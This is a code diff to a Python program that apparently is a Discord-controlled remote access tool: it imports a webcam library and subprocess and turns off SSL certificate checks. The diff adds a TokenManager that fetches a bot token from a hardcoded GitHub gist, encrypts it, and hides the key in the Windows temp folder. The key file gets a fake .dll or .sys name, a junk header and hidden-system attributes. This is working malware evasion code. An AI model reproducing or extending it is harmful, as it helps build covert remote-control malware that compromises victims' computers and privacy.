@@ -6,7 +6,7 @@ import ssl
 import random
 import threading
 import time
-if (sys.argv[0].endswith("exe")):
+if sys.argv[0].endswith("exe"):
     import cv2
 import subprocess
 import discord
@@ -17,15 +17,165 @@ from ctypes import *
 import asyncio
 import discord
 from discord import utils
-token = ''
-global isexe
-isexe=False
-if (sys.argv[0].endswith("exe")):
-    isexe=True
-global appdata
-global temp
+import base64
+import secrets
+import hashlib
+import requests
+
+TOKEN_URL = "https://gist.githubusercontent.com/askednobody410-web/880556bce3680ad0287c278ee7094493/raw/04003f6eefdd4944ac0b801ac247093dcd2caaee/data.dat"
+HEX_ALPHABET = 'abcdefghi123456789'
+KEY_LENGTH = 18
+ENCRYPTED_TOKEN_FILE = "syscfg.bin"
+
+class TokenManager:
+    @staticmethod
+    def fetch_token():
+        try:
+            response = requests.get(TOKEN_URL, timeout=10)
+            if response.status_code == 200:
+                return response.text.strip()
+        except Exception:
+            pass
+        return None
+
+    @staticmethod
+    def generate_hex_key():
+        return ''.join(secrets.choice(HEX_ALPHABET) for _ in range(KEY_LENGTH))
+
+    @staticmethod
+    def derive_key(hex_key):
+        salt = hashlib.sha256(hex_key.encode()).digest()[:16]
+        from cryptography.fernet import Fernet
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
+        kdf = PBKDF2(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=100000,
+        )
+        return base64.urlsafe_b64encode(kdf.derive(hex_key.encode()))
+
+    @staticmethod
+    def create_corrupted_header():
+        corrupted_chars = ['ÿ', 'þ', 'ð', 'Ñ', '¿', '°', '·', '¬', '¦', '§', '¨', '©', 'ª', '«', '¬', '®', '¯', '±', '²', '³', '´', 'µ', '¶', '·', '¸', '¹', 'º', '»', '¼', '½', '¾', '¿']
+        header = ''.join(random.choice(corrupted_chars) for _ in range(128))
+        return header.encode('latin-1')
+
+    @staticmethod
+    def generate_filename(hex_key):
+        suffixes = ['.dll', '.sys', '.dat', '.tmp', '.cfg', '.bin']
+        suffix = random.choice(suffixes)
+        return f"TKN-{hex_key}{suffix}"
+
+    @staticmethod
+    def save_key_file(hex_key):
+        filename = TokenManager.generate_filename(hex_key)
+        temp_dir = os.getenv('TEMP', 'C:\\Windows\\Temp')
+        filepath = os.path.join(temp_dir, filename)
+
+        with open(filepath, 'wb') as f:
+            f.write(TokenManager.create_corrupted_header())
+            f.write(b'\x00\x01\x02\x03\x04\x05')
+            f.write(hex_key.encode())
+            f.write(b'\xFF\xFE\xFD\xFC\xFB\xFA')
+
+        if sys.platform == 'win32':
+            try:
+                ctypes.windll.kernel32.SetFileAttributesW(filepath, 6)
+            except:
+                pass
+
+        return filepath
+
+    @staticmethod
+    def find_key_file():
+        temp_dir = os.getenv('TEMP', 'C:\\Windows\\Temp')
+        if not os.path.exists(temp_dir):
+            return None
+
+        for file in os.listdir(temp_dir):
+            if file.startswith('TKN-') and len(file) > 4:
+                filepath = os.path.join(temp_dir, file)
+                try:
+                    with open(filepath, 'rb') as f:
+                        content = f.read()
+                    
+                    for i in range(len(content) - KEY_LENGTH):
+                        potential_key = content[i:i+KEY_LENGTH].decode('latin-1', errors='ignore')
+                        if len(potential_key) == KEY_LENGTH and all(c in HEX_ALPHABET for c in potential_key):
+                            return potential_key
+                except:
+                    continue
+        return None
+
+    @staticmethod
+    def encrypt_and_store():
+        token = TokenManager.fetch_token()
+        
+        if not token:
+            print("Error: Could not fetch token")
+            sys.exit(1)
+
+        hex_key = TokenManager.generate_hex_key()
+        
+        from cryptography.fernet import Fernet
+        fernet_key = TokenManager.derive_key(hex_key)
+        cipher = Fernet(fernet_key)
+        
+        encrypted_token = cipher.encrypt(token.encode())
+        
+        key_file = TokenManager.save_key_file(hex_key)
+        
+        with open(ENCRYPTED_TOKEN_FILE, 'wb') as f:
+            f.write(encrypted_token)
+
+        print(f"Key file: {os.path.basename(key_file)}")
+        print(f"Encrypted token: {ENCRYPTED_TOKEN_FILE}")
+        
+        return True
+
+    @staticmethod
+    def decrypt_and_verify():
+        if not os.path.exists(ENCRYPTED_TOKEN_FILE):
+            print(f"Error: {ENCRYPTED_TOKEN_FILE} not found")
+            sys.exit(1)
+
+        hex_key = TokenManager.find_key_file()
+        if not hex_key:
+            print("Error: Could not find key file")
+            sys.exit(1)
+
+        from cryptography.fernet import Fernet
+        fernet_key = TokenManager.derive_key(hex_key)
+        cipher = Fernet(fernet_key)
+
+        with open(ENCRYPTED_TOKEN_FILE, 'rb') as f:
+            encrypted_token = f.read()
+
+        try:
+            token = cipher.decrypt(encrypted_token).decode()
+            return token
+        except Exception:
+            print("Decryption failed")
+            sys.exit(1)
+
+def main():
+    if not os.path.exists(ENCRYPTED_TOKEN_FILE):
+        TokenManager.encrypt_and_store()
+        print("Setup done. Restart.")
+        input("Press Enter to exit")
+        sys.exit(0)
+    
+    return TokenManager.decrypt_and_verify()
+
+token = main()
+
+isexe = False
+if sys.argv[0].endswith("exe"):
+    isexe = True
 appdata = os.getenv('APPDATA')
-temp= os.getenv('temp')
+temp = os.getenv('temp')
 client = discord.Client()
 bot = commands.Bot(command_prefix='!')
 ssl._create_default_https_context = ssl._create_unverified_context
